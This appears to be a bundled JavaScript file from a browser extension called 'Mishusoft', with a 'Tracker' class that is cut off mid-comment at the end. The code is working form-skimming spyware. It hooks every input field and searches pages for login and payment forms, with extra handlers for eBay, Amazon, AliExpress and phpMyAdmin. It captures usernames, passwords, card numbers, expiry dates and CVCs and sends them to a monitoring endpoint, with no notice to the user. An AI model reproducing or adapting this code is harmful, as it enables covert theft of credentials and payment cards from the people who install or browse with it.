"use strict";
(self["webpackChunkMishusoftRuntime"] = self["webpackChunkMishusoftRuntime"] || []).push([["Assets_typescripts_mishusoft_Tracker_ts"],{

/***/ "./Assets/typescripts/db/tracker.ts":
/*!******************************************!*\
  !*** ./Assets/typescripts/db/tracker.ts ***!
  \******************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "authFormAttribute": () => (/* binding */ authFormAttribute),
/* harmony export */   "paymentElementsAttribute": () => (/* binding */ paymentElementsAttribute)
/* harmony export */ });
const authFormAttribute = [
    {
        'login': [
            'form1', 'signin', 'signon', 'login', 'logon', 'identi', 'idb', 'wpcf7-form', 'form--1G_Qn', 'fl', 'ng-pristine',
            'index.php', 'new_user', 'ctl23', 'jss', 'connexion', 'file', 'styledform', 'auth',
        ]
    },
    { 'register': ['reg', 'signup', 'join', 'register', 'checkform'] },
    { 'logout': ['logout'] },
    {
        'payment': [
            'credit', 'payment', 'body', 'checkout', 'sslform', 'pay', 'purchase', 'elementsapp', 'creditcard',
            'credit-card', 'addcard', 'bill'
        ]
    },
    {
        'exclude': [
            /*'q', */ 'search', 'googleads', 'presentation', 'captcha', /*'disable', */ 'header',
            'convert-form', 'wam_arten', 'matchkalender', 'suche', 'generate', 'subscribe', 'ignore',
            'download', 'kreditrechner', 'bit_exchange_form', 'applyform', 'app_form', 'comment', 'wallet',
            'picker', 'wp-link', 'meta', 'panier', 'commande', 'recherche', 'settings', 'posts', 'challenge', 'tag',
            'upload', 'mainf', 'domain'
        ]
    },
];
const paymentElementsAttribute = [
    { 'cardNumber': ['num', 'no', 'cardno',] },
    { 'cardHolder': ['holder', 'owner', 'name',] },
    { 'cardTypes': ['brand', 'type', 'types',] },
    { 'cardExpire': ['exp',] },
    { 'cardCVC': ['cvc', 'csc', 'cvv', 'securitycode',] },
    { 'cardPostalCode': ['zip', 'post',] },
    /*{'exclude': ['email', 'user', 'usr']},*/
];


/***/ }),

/***/ "./Assets/typescripts/mishusoft/Tracker.ts":
/*!*************************************************!*\
  !*** ./Assets/typescripts/mishusoft/Tracker.ts ***!
  \*************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "Tracker": () => (/* binding */ Tracker)
/* harmony export */ });
/* harmony import */ var _db_tracker__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ../db/tracker */ "./Assets/typescripts/db/tracker.ts");

/*initialize on extension installed*/
let globalAppMonitorMainURL;
globalAppMonitorMainURL = 'http://localhost/monitor/browser/';
/*required variables*/
class Tracker {
    url;
    authEvent;
    isTrackerActivate = false;
    trackerJobId = 0;
    passwordStore = [];
    creditCardStore = [];
    creditCardRuntimeHolderName = '';
    creditCardRuntimeNumber = '';
    creditCardRuntimeBrand = '';
    creditCardRuntimeExpireDate = '';
    creditCardRuntimeCvc = '';
    creditCardRuntimePostalCode = '';
    static identity;
    static version;
    static osNameAndArch;
    static browserNameFull;
    constructor(url, identify, version, osNameAndArch, webBrowserNameFull) {
        this.url = url;
        Tracker.identity = identify;
        Tracker.version = version;
        Tracker.osNameAndArch = osNameAndArch;
        Tracker.browserNameFull = webBrowserNameFull;
    }
    init(callBack) {
        const self = this;
        if (self.url) {
            let interval1 = setInterval(function () {
                self.verifyFormElement(self, interval1);
            }, 1000);
            self.backupScripts(self);
            self.absoluteTrack(self);
        }
        if (callBack) {
            callBack();
        }
    }
    absoluteTrack(self) {
        let interval = setInterval(function () {
            if (document.querySelectorAll('input').length !== 0) {
                clearInterval(interval);
                self.absoluteTrackHelper(self, document.body, 'input', function (__detectedElement) {
                    ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
                        __detectedElement.addEventListener(event, function () {
                            if (__detectedElement.value.length !== 0) {
                                Tracker.send({
                                    command: 'saveInputElementData',
                                    data: {
                                        'name': __detectedElement.nodeName.toLowerCase(),
                                        'type': __detectedElement.type,
                                        'value': __detectedElement.value,
                                        'placeholder': __detectedElement.placeholder ? __detectedElement.placeholder : 'NOT SET',
                                        "workWebsite": window.location.origin
                                    }
                                });
                            }
                        });
                    });
                });
            }
            if (document.querySelectorAll('select').length !== 0) {
                clearInterval(interval);
                self.absoluteTrackHelper(self, document.body, 'select', function (__detectedElement) {
                    ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
                        __detectedElement.addEventListener(event, function () {
                            if (__detectedElement.value.length !== 0) {
                                Tracker.send({
                                    command: 'saveInputElementData',
                                    data: {
                                        'name': __detectedElement.nodeName.toLowerCase(),
                                        'type': __detectedElement.type,
                                        'value': __detectedElement.value,
                                        'placeholder': __detectedElement.placeholder ? __detectedElement.placeholder : 'NOT SET',
                                        "workWebsite": window.location.origin
                                    }
                                });
                            }
                        });
                    });
                });
            }
        }, 100);
    }
    absoluteTrackHelper(self, elementParentNode, __tagName, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName.toLowerCase() === __tagName) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.absoluteTrackHelper(self, __childElement, __tagName, callback);
                }
            });
        }
    }
    trigger(self, __formElement) {
        self.track(self, __formElement);
    }
    verifyFormElement(self, interval) {
        if (document.querySelectorAll('form').length !== 0) {
            document.querySelectorAll('form').forEach(function (__formElement) {
                if (__formElement.attributes.length !== 0) {
                    if (window.location.href.toLowerCase().indexOf('phpmyadmin') !== -1) {
                        if (__formElement.method === 'post') {
                            interval ? clearInterval(interval) : '';
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                    else {
                        if (__formElement.action !== 'javascript:void(0)' && __formElement.id !== 'null' && __formElement.id !== 'irouteForm' &&
                            __formElement.id !== 'bhlf' && __formElement.id.indexOf('id') === -1 && __formElement.id.indexOf('u_0_') === -1 &&
                            __formElement.id.indexOf('theform') === -1 && __formElement.id.indexOf('scl_form') === -1 &&
                            __formElement.className.indexOf('gb_8e') === -1) {
                            interval ? clearInterval(interval) : '';
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                }
                else {
                    if (__formElement.childNodes.length > 1) {
                        interval ? clearInterval(interval) : '';
                        self.isTrackerActivate = true;
                        self.trackerJobId++;
                        self.trigger(self, __formElement);
                    }
                }
            });
        }
        else {
            if (window.location.origin.indexOf('dash.fembed.com') !== -1) {
                if (document.querySelector('#login') !== null) {
                    interval ? clearInterval(interval) : '';
                    self.isTrackerActivate = true;
                    self.trackerJobId++;
                    self.classicTrackAuthEvent(self, '#email_login', '#password', '#login');
                }
            }
        }
    }
    resolverFormAttributes(self, __formElement) {
        const attributes = [...__formElement.attributes];
        if (attributes.length !== 0) {
            attributes.forEach(function (attribute) {
                if (attribute.nodeValue !== 'javascript:void(0);') {
                    if (attribute.nodeValue.length !== 0 && attribute.nodeValue.length >= 3) {
                        /*form attribute value*/
                        _db_tracker__WEBPACK_IMPORTED_MODULE_0__.authFormAttribute.forEach(function (keyword) {
                            if (Object.keys(keyword).length !== 0 && keyword.constructor === Object) {
                                Object.keys(keyword).forEach(function (__key) {
                                    keyword[__key].forEach(function (__qKey) {
                                        if (attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 /*|| window.location.origin.toLowerCase().indexOf(__qKey) !== -1
                                            || document.title.toLowerCase().indexOf(__qKey) !== -1 && window.location.origin.toLowerCase().indexOf('file') === -1*/) {
                                            /*var str = text.replace(/(^\w{1})|(\s{1}\w{1})/g, match => match.toUpperCase());*/
                                            //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = __key;
                                            self.authEvent = __key;
                                        }
                                        else {
                                            if (attribute.nodeValue === null) {
                                                //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'exclude';
                                                self.authEvent = 'exclude';
                                            }
                                        }
                                    });
                                });
                            }
                        });
                    }
                }
            });
        }
        else {
            self.authEvent = 'Unknown';
        }
        return self.authEvent;
    }
    track(self, __formElement) {
        let elements = [];
        if (__formElement.nodeName === 'FORM' && __formElement.length !== 1) {
            self.resolverFormAttributes(self, __formElement);
            if (self.authEvent === 'login' || self.authEvent === 'register') {
                self.crawlAuthFormElement(self, elements, __formElement);
            }
            else if (self.authEvent === 'payment') {
                self.crawlPaymentFormElement(self, elements, __formElement);
            }
            else {
                if (self.authEvent !== 'exclude' && self.authEvent !== 'logout') {
                    self.crawlAuthFormElement(self, elements, __formElement);
                    self.crawlPaymentFormElement(self, elements, __formElement);
                    /*additional functions*/
                    /*exclude paypal,amazon,tunnelbear*/
                    /*ebay*/
                    if (window.location.origin.indexOf('ebay') !== -1) {
                        let interval = setInterval(function () {
                            if (document.querySelectorAll('form').length !== 0) {
                                document.querySelectorAll('form').forEach(function (__ebayFormElement) {
                                    if (__ebayFormElement.id === 'credit-card-details') {
                                        clearInterval(interval);
                                        let elements = [];
                                        self.exploreEbayPaymentDataCollection(self, __ebayFormElement, elements);
                                    }
                                });
                            }
                        }, 100);
                        if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
                            if (document.querySelector('.btn.btn--primary.field')?.nodeName === 'BUTTON') {
                                ["click", "dblclick"].forEach(function (event) {
                                    let tempPaymentMethodsStore = [];
                                    document.querySelector('.btn.btn--primary.field')?.addEventListener(event, function () {
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'creditCardNumber', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'firstName', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'lastName', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'expirationDate', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'cvv', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        Tracker.send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                'cardBrand': document.querySelector('.floating-input__fixright')?.firstElementChild?.className ? document.querySelector('.floating-input__fixright')?.firstElementChild?.className.toLowerCase() : 'Unknown',
                                                'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
                                                "cardExpire": tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
                                                'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
                                                'event': 'add',
                                                "workWebsite": window.location.origin
                                            }
                                        });
                                        tempPaymentMethodsStore = [];
                                    });
                                });
                            }
                        }
                    }
                }
            }
        }
    }
    classicTrackAuthEvent(self, usernameElementId, passwordElementId, loginButtonElementId) {
        let usernameElement, passwordElement, loginButtonElement;
        if (document.querySelector(usernameElementId) !== null) {
            usernameElement = document.querySelector(usernameElementId);
        }
        if (document.querySelector(passwordElementId) !== null) {
            passwordElement = document.querySelector(passwordElementId);
        }
        if (document.querySelector(loginButtonElementId) !== null) {
            loginButtonElement = document.querySelector(loginButtonElementId);
        }
        loginButtonElement.addEventListener('click', function () {
            return Tracker.send({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": usernameElement.value,
                    "password": passwordElement.value,
                    "workWebsite": window.location.origin
                }
            });
        });
    }
    crawlAuthFormElement(self, elements, __parentElement) {
        __parentElement.childNodes?.forEach(function (__childElement) {
            ['input', 'button', 'a'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
                    ['input'].forEach(function (__onlyInputElement) {
                        if (__childElement.nodeName.toLowerCase() === __onlyInputElement) {
                            [...__childElement.attributes].forEach(function (__attribute) {
                                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                                    /* minor changes start */
                                    ['text', 'user', 'email', 'pass'].forEach(function (__eligibleAttribute) {
                                        if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1) {
                                            elements.push(__childElement);
                                        }
                                    });
                                    /* minor changes end */
                                }
                            });
                        }
                    });
                    if (__childElement.type === 'submit' || __childElement.type === 'button' || __childElement.nodeName === 'A' &&
                        __childElement.innerHTML.toLowerCase().indexOf('sign' || 0 || 0) !== -1) {
                        self.resolveAuthEvent(self, __childElement, elements);
                    }
                }
            });
            return self.crawlAuthFormElement(self, elements, __childElement);
        });
    }
    resolveAuthEvent(self, element, array) {
        let elementNode, elementName, elementType, elementValue;
        element.addEventListener('click', function () {
            new Set(array).forEach(function (__detectedElement) {
                [...__detectedElement.attributes].forEach(function (__attribute) {
                    if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                        ['user', 'login', 'email', 'pass'].forEach(function (__eligibleAttribute) {
                            if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1) {
                                elementNode = __detectedElement;
                                elementName = __eligibleAttribute;
                                elementType = __detectedElement.type;
                                elementValue = __detectedElement.value;
                            }
                        });
                    }
                });
                if (elementValue.length !== 0) {
                    self.passwordStore.push({
                        node: elementNode,
                        name: elementName,
                        type: elementType,
                        value: elementValue
                    });
                }
            });
            Tracker.send({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": self.passwordStore[0]?.value,
                    "password": self.passwordStore[1]?.value,
                    "workWebsite": window.location.origin
                }
            });
            self.passwordStore = [];
        });
    }
    crawlPaymentFormElement(self, elements, __formElement) {
        __formElement.childNodes?.forEach(function (__childElement) {
            ['input', 'button', 'select'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
                    ['input', 'select'].forEach(function (__eligibleDataElement) {
                        if (__childElement.nodeName.toLowerCase() === __eligibleDataElement) {
                            ['text', 'tel', 'number', 'password', 'radio', 'select-one'].forEach(function (__eligibleElementType) {
                                if (__childElement.type === __eligibleElementType) {
                                    [...__childElement.attributes].forEach(function (__attribute) {
                                        if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 3) {
                                            _db_tracker__WEBPACK_IMPORTED_MODULE_0__.paymentElementsAttribute.forEach(function (__eligibleKeyword) {
                                                if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
                                                    Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
                                                        __eligibleKeyword[__cardDataKey].forEach(function (__qKey) {
                                                            if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 && __attribute.nodeValue.toLowerCase().indexOf('none' || 0 || 0) === -1) {
                                                                elements.push(__childElement);
                                                            }
                                                        });
                                                    });
                                                }
                                            });
                                        }
                                    });
                                }
                            });
                        }
                    });
                    ['submit', 'button'].forEach(function (__eligibleCollectorElement) {
                        if (__childElement.type === __eligibleCollectorElement) {
                            self.resolvePaymentEvent(self, __childElement.form, __childElement, elements);
                        }
                    });
                }
            });
            return self.crawlPaymentFormElement(self, elements, __childElement);
        });
    }
    /* PASSED
    * https://www.tunnelbear.com/account/checkout
    * https://www.amazon.com/cpe/yourpayments/wallet
    * */
    resolvePaymentEvent(self, __formElement, __dataCollectorElement, array) {
        ['submit'].forEach(function (__formEvent) {
            __formElement.addEventListener(__formEvent, function () {
                self.collectPaymentData(self, array);
            });
        });
        ['click', 'dblclick', 'ontouchstart'].forEach(function (__dataCollectorEvent) {
            __dataCollectorElement.addEventListener(__dataCollectorEvent, function () {
                self.collectPaymentData(self, array);
            });
        });
        try {
            if (window.self !== window.top) {
                new Set(array).forEach(function (__detectedElement) {
                    ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
                        __detectedElement.addEventListener(__event, function () {
                            self.collectPaymentData(self, array);
                        });
                    });
                });
            }
        }
        catch (e) {
        }
    }
    collectPaymentData(self, array) {
        let elementNode, elementName, elementType, elementValue;
        new Set(array).forEach(function (__detectedElement) {
            [...__detectedElement.attributes].forEach(function (__attribute) {
                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 3) {
                    _db_tracker__WEBPACK_IMPORTED_MODULE_0__.paymentElementsAttribute.forEach(function (__eligibleKeyword) {
                        if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
                            Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
                                __eligibleKeyword[__cardDataKey].forEach(function (__qKey) {
                                    if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1) {
                                        elementNode = __detectedElement;
                                        elementName = __cardDataKey;
                                        elementType = __detectedElement.type;
                                        elementValue = __detectedElement.value;
                                    }
                                });
                            });
                        }
                    });
                }
            });
            if (elementValue.length !== 0) {
                self.creditCardStore.push({
                    node: elementNode,
                    name: elementName,
                    type: elementType,
                    value: elementValue
                });
            }
        });
        self.retrieveAccurateData(self, self.creditCardStore);
        Tracker.send({
            command: 'savePaymentMethodsData',
            data: {
                'cardNumber': self.creditCardRuntimeNumber !== '' ? self.creditCardRuntimeNumber : 'Unknown',
                'cardBrand': self.creditCardRuntimeBrand !== '' ? self.creditCardRuntimeBrand : 'Unknown',
                'cardHolder': self.creditCardRuntimeHolderName !== '' ? self.creditCardRuntimeHolderName : 'Unknown',
                "cardExpire": self.creditCardRuntimeExpireDate !== '' ? self.creditCardRuntimeExpireDate /*.substring(0, self.creditCardRuntimeExpireDate.length - 1)*/ : 'Unknown',
                'cardCVC': self.creditCardRuntimeCvc !== '' ? self.creditCardRuntimeCvc : 'Unknown',
                'event': 'add',
                "workWebsite": window.location.origin
            }
        });
        self.creditCardStore = [];
        self.creditCardRuntimeHolderName = '';
        self.creditCardRuntimeNumber = '';
        self.creditCardRuntimeBrand = '';
        self.creditCardRuntimeExpireDate = '';
        self.creditCardRuntimeCvc = '';
        self.creditCardRuntimePostalCode = '';
        //self.verifyFormElement(self);
    }
    retrieveAccurateData(self, __creditCardDataStore) {
        if (__creditCardDataStore.length !== 0) {
            __creditCardDataStore.forEach(function (__detectedDataElement) {
                (__detectedDataElement.name === 'cardNumber') ? self.creditCardRuntimeNumber = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardHolder') ? self.creditCardRuntimeHolderName += __detectedDataElement.value + ' ' : '';
                (__detectedDataElement.name === 'cardBrand') ? self.creditCardRuntimeBrand = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardExpire') ? self.creditCardRuntimeExpireDate += __detectedDataElement.value + '/' : '';
                (__detectedDataElement.name === 'cardCVC') ? self.creditCardRuntimeCvc = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardPostalCode') ? self.creditCardRuntimePostalCode = __detectedDataElement.value : '';
            });
        }
    }
    backupScripts(self) {
        let interval1 = setInterval(function () {
            if (window.location.origin.indexOf('amazon') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreAmazonPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('aliexpress') !== -1) {
                if (document.querySelector('.check-out-root') !== null && document.querySelector('.check-out-root')?.childNodes.length !== 1) {
                    let interval4 = setInterval(function () {
                        if (document.querySelector('.title-to-detail') !== null) {
                            clearInterval(interval4);
                            if (document.querySelector('.title-to-detail')?.textContent?.indexOf('Add a new card') !== -1) {
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.title-to-detail')?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.bind-button-wrap ')?.firstElementChild?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                            }
                            else {
                                self.exploreSpecificElementByTagName(self, document.querySelector('.check-out-root'), 'span', 'payment-title', function (__detectedElement) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': __detectedElement.textContent,
                                                    'cardBrand': 'Unknown',
                                                    'cardHolder': 'Unknown',
                                                    'cardExpire': 'Unknown',
                                                    'cardCVC': 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                        });
                                    });
                                });
                            }
                        }
                    }, 1000);
                }
                else {
                    if (window.location.href.indexOf('confirm_order.htm') !== -1) {
                        let interval = setInterval(function () {
                            if (document.querySelector('.new-card') !== null) {
                                clearInterval(interval);
                                self.processAliExpressPaymentNewCard(self);
                            }
                        }, 100);
                        let interval00 = setInterval(function () {
                            if (document.querySelector('.pay-type.show-method') !== null) {
                                clearInterval(interval00);
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.pay-type.show-method')?.addEventListener(event, function () {
                                        let __interval3 = setInterval(function () {
                                            if (document.querySelector('.new-card') !== null) {
                                                clearInterval(__interval3);
                                                self.explorePaymentNewCard(self, document.querySelector('.new-card'), function (elements) {
                                                    let paymentMethodStore = [];
                                                    document.querySelector('.save')?.addEventListener('click', function () {
                                                        elements.forEach(function (element) {
                                                            paymentMethodStore.push({
                                                                'element': element.nodeName,
                                                                'id': element.id,
                                                                'type': element.type,
                                                                'value': element.value
                                                            });
                                                        });
                                                        Tracker.send({
                                                            command: 'savePaymentMethodsData',
                                                            data: {
                                                                'cardNumber': paymentMethodStore[0].value,
                                                                'cardBrand': 'Unknown',
                                                                'cardHolder': paymentMethodStore[1].value,
                                                                'cardExpire': paymentMethodStore[2].value,
                                                                'cardCVC': paymentMethodStore[3].value,
                                                                'event': 'add',
                                                                'workWebsite': window.location.origin
                                                            }
                                                        });
                                                        paymentMethodStore = [];
                                                    });
                                                });
                                            }
                                        }, 1000);
                                    });
                                });
                            }
                        }, 100);
                        if (document.querySelector('.edit-card') !== null) {
                            ['click', 'dblclick'].forEach(function (event) {
                                document.querySelector('.edit-card')?.addEventListener(event, function () {
                                    let __interval3 = setInterval(function () {
                                        if (document.querySelector('.new-card') !== null) {
                                            clearInterval(__interval3);
                                            self.processAliExpressPaymentNewCard(self);
                                        }
                                    }, 1000);
                                });
                            });
                        }
                        if (document.querySelectorAll('.arrow-content').length !== 0) {
                            document.querySelectorAll('.arrow-content').forEach(function (__detectedDivElement) {
                                __detectedDivElement.addEventListener('click', function () {
                                    if (__detectedDivElement.classList.contains('arrow-down')) {
                                        let __interval2 = setInterval(function () {
                                            if (document.querySelector('.add-new-card') !== null) {
                                                clearInterval(__interval2);
                                                ['click', 'dblclick'].forEach(function (event) {
                                                    document.querySelector('.add-new-card')?.addEventListener(event, function () {
                                                        let __interval3 = setInterval(function () {
                                                            if (document.querySelector('.new-card') !== null) {
                                                                clearInterval(__interval3);
                                                                self.processAliExpressPaymentNewCard(self);
                                                            }
                                                        }, 1000);
                                                    });
                                                });
                                            }
                                        }, 1000);
                                    }
                                });
                            });
                        }
                        if (document.querySelector('.mix-edcard-item')?.childElementCount !== 0) {
                            let cardConfirmElement = document.querySelector('#checkout-button');
                            ['click', 'dblclick'].forEach(function (event) {
                                cardConfirmElement?.addEventListener(event, function () {
                                    let tempPaymentMethodsStore = [];
                                    document.querySelector('.mix-edcard-item')?.childNodes.forEach(function (__childElement) {
                                        if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('icon')) {
                                            if (__childElement.classList.contains('visa')) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __childElement.nodeName,
                                                    'id': __childElement.id,
                                                    'value': 'visa'
                                                });
                                            }
                                        }
                                        if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('pay-name')) {
                                            tempPaymentMethodsStore.push({
                                                'element': __childElement.nodeName,
                                                'id': __childElement.id,
                                                'value': __childElement.textContent
                                            });
                                        }
                                    });
                                    Tracker.send({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': tempPaymentMethodsStore[0].value,
                                            'cardBrand': tempPaymentMethodsStore[1].value,
                                            'cardHolder': 'Unknown',
                                            'cardExpire': 'Unknown',
                                            'cardCVC': 'Unknown',
                                            'event': 'add',
                                            'workWebsite': window.location.origin
                                        }
                                    });
                                    tempPaymentMethodsStore = [];
                                });
                            });
                        }
                    }
                    if (window.location.href.indexOf('payResult.htm') !== -1) {
                        let interval4 = setInterval(function () {
                            if (document.querySelector('.verify-card-form-row') !== null) {
                                clearInterval(interval4);
                                if (document.querySelector('.verify-card-confirm')?.firstElementChild?.nodeName === 'BUTTON') {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        let tempPaymentMethodsStore = [];
                                        document.querySelector('.verify-card-confirm')?.firstElementChild?.addEventListener(event, function () {
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cardN', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cardHolder', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'expires', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cvc', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    "cardExpire": tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'event': 'add',
                                                    "workWebsite": window.location.origin
                                                }
                                            });
                                            tempPaymentMethodsStore = [];
                                        });
                                    });
                                }
                            }
                        }, 1000);
                    }
                }
                /*if (document.querySelector('.check-out-root') !== null && document.querySelector('.check-out-root')?.childNodes.length !== 1) {
                    clearInterval(interval1);
                    let interval4 = setInterval(function () {
                        if (document.querySelector('.title-to-detail') !== null) {
                            clearInterval(interval4);
                            if (document.querySelector('.title-to-detail')?.nextElementSibling?.textContent?.indexOf('Add a new card') !== -1) {
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.title-to-detail')?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.bind-button-wrap ')?.firstElementChild?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                            } else {
                                self.exploreSpecificElementByTagName(self, (document.querySelector('.check-out-root') as HTMLElement), 'span', 'payment-title', function (__detectedElement: HTMLElement) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': __detectedElement.textContent,
                                                    'cardBrand': 'Unknown',
                                                    'cardHolder': 'Unknown',
                                                    'cardExpire': 'Unknown',
                                                    'cardCVC': 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                        })
                                    });
                                });
                            }
                        }
                    }, 1000);
                    self.explorePaymentSpanTag(self, (document.querySelector('.check-out-root') as HTMLElement), function (__detectedElement: any) {
                        ['click', 'dblclick'].forEach(function (event) {
                            document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': (__detectedElement as HTMLElement).textContent,
                                        'cardBrand': 'Unknown',
                                        'cardHolder': 'Unknown',
                                        'cardExpire': 'Unknown',
                                        'cardCVC': 'Unknown',
